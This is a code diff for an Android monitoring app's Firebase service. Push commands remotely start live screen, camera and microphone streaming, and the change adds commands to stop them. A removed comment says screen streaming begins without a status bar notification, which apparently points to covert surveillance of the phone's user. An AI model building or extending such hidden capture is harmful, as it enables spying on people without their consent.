@@ -41,42 +41,58 @@ class SpappFirebaseMessagingService : FirebaseMessagingService() {
             return
         }
 
-        // Fast path: if this is a screen stream command, start streaming directly without status bar notification
+        // Fast path: if this is a screen stream command
         if (message.data["commandType"] == "screen_stream") {
-            val deviceId = DeviceState(applicationContext).getEffectiveDeviceId()
-            val authToken = DeviceState(applicationContext).authToken
-            if (deviceId != null && authToken != null && com.spapp.monitoring.blocking.BlockAccessibilityService.instance != null) {
-                Log.d(TAG, "FCM fast-path: triggering screen stream directly via ScreenStreamManager")
-                com.spapp.monitoring.screenstream.ScreenStreamManager.startStreaming(
-                    context = applicationContext,
-                    authToken = authToken,
-                    deviceId = deviceId
-                )
+            val action = message.data["action"] ?: "start"
+            if (action == "stop") {
+                com.spapp.monitoring.screenstream.ScreenStreamManager.stopStreaming()
+                com.spapp.monitoring.screenstream.ScreenStreamService.stop(applicationContext)
+            } else {
+                val deviceId = DeviceState(applicationContext).getEffectiveDeviceId()
+                val authToken = DeviceState(applicationContext).authToken
+                if (deviceId != null && authToken != null && com.spapp.monitoring.blocking.BlockAccessibilityService.instance != null) {
+                    Log.d(TAG, "FCM fast-path: triggering screen stream directly via ScreenStreamManager")
+                    com.spapp.monitoring.screenstream.ScreenStreamManager.startStreaming(
+                        context = applicationContext,
+                        authToken = authToken,
+                        deviceId = deviceId
+                    )
+                }
             }
         }
 
-        // Fast path: if this is a camera stream command, start streaming immediately
+        // Fast path: if this is a camera stream command
         if (message.data["commandType"] == "camera_stream") {
-            val hasCameraPermission = androidx.core.content.ContextCompat.checkSelfPermission(
-                applicationContext,
-                android.Manifest.permission.CAMERA
-            ) == android.content.pm.PackageManager.PERMISSION_GRANTED
-            if (hasCameraPermission) {
-                val targetLens = message.data["lens"] ?: "back"
-                Log.d(TAG, "FCM fast-path: triggering camera stream with lens: $targetLens")
-                com.spapp.monitoring.camerastream.CameraStreamService.start(applicationContext, targetLens)
+            val action = message.data["action"] ?: "start"
+            if (action == "stop") {
+                com.spapp.monitoring.camerastream.CameraStreamService.stop(applicationContext)
+            } else {
+                val hasCameraPermission = androidx.core.content.ContextCompat.checkSelfPermission(
+                    applicationContext,
+                    android.Manifest.permission.CAMERA
+                ) == android.content.pm.PackageManager.PERMISSION_GRANTED
+                if (hasCameraPermission) {
+                    val targetLens = message.data["lens"] ?: "back"
+                    Log.d(TAG, "FCM fast-path: triggering camera stream with lens: $targetLens")
+                    com.spapp.monitoring.camerastream.CameraStreamService.start(applicationContext, targetLens)
+                }
             }
         }
 
-        // Fast path: if this is an audio stream command, start streaming immediately
+        // Fast path: if this is an audio stream command
         if (message.data["commandType"] == "audio_stream") {
-            val hasAudioPermission = androidx.core.content.ContextCompat.checkSelfPermission(
-                applicationContext,
-                android.Manifest.permission.RECORD_AUDIO
-            ) == android.content.pm.PackageManager.PERMISSION_GRANTED
-            if (hasAudioPermission) {
-                Log.d(TAG, "FCM fast-path: triggering audio stream immediately")
-                com.spapp.monitoring.audiostream.AudioStreamService.start(applicationContext)
+            val action = message.data["action"] ?: "start"
+            if (action == "stop") {
+                com.spapp.monitoring.audiostream.AudioStreamService.stop(applicationContext)
+            } else {
+                val hasAudioPermission = androidx.core.content.ContextCompat.checkSelfPermission(
+                    applicationContext,
+                    android.Manifest.permission.RECORD_AUDIO
+                ) == android.content.pm.PackageManager.PERMISSION_GRANTED
+                if (hasAudioPermission) {
+                    Log.d(TAG, "FCM fast-path: triggering audio stream immediately")
+                    com.spapp.monitoring.audiostream.AudioStreamService.start(applicationContext)
+                }
             }
         }
 
